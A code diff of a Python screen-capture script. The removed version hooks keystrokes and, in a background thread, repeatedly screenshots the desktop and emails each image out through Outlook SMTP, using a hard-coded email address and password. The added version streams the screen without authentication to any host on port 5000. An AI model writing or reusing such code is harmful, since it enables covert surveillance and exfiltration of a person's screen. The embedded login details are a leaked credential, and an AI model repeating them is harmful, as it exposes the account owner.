@@ -1,60 +1,24 @@
-import keyboard
+from flask import Flask, Response
 import cv2
 import numpy as np
 from mss import mss
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import threading
 
-# Set up email configuration
-email_address = 'ahmedmrh20@hotmail.com'
-email_password = '123bomteam123'
+app = Flask(__name__)
 
-# Function to send email with attachment
-def send_email(filename):
-    msg = MIMEMultipart()
-    msg['From'] = email_address
-    msg['To'] = email_address
-    msg['Subject'] = 'Screen Recording'
-
-    body = 'Screen recording attached.'
-    msg.attach(MIMEText(body, 'plain'))
-
-    attachment = open(filename, 'rb')
-
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload((attachment).read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
-    msg.attach(part)
-
-    server = smtplib.SMTP('smtp-mail.outlook.com', 587)
-    server.starttls()
-    server.login(email_address, email_password)
-    text = msg.as_string()
-    server.sendmail(email_address, email_address, text)
-    server.quit()
-
-# Function to send keystrokes
-def send_keystrokes(event):
-    pass  # You might want to handle this differently if you still want to send keystrokes
-
-# Start monitoring keystrokes
-keyboard.hook(send_keystrokes)
-
-# Function to stream screen and send recording by email
-def stream_screen_and_send_email():
+def generate():
     with mss() as sct:
         while True:
             frame = np.array(sct.grab(sct.monitors[1]))
-            filename = 'screen_recording.jpg'
-            cv2.imwrite(filename, frame)
-            send_email(filename)
+            ret, buffer = cv2.imencode('.jpg', frame)
+            frame = buffer.tobytes()
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 
-# Start streaming screen and sending recording by email
-screen_thread = threading.Thread(target=stream_screen_and_send_email)
-screen_thread.start()
+@app.route('/video_feed')
+def video_feed():
+    return Response(generate(),
+                    mimetype='multipart/x-mixed-replace; boundary=frame')
+
+if __name__ == '__main__':
+    from waitress import serve
+    serve(app, host='0.0.0.0', port=5000)
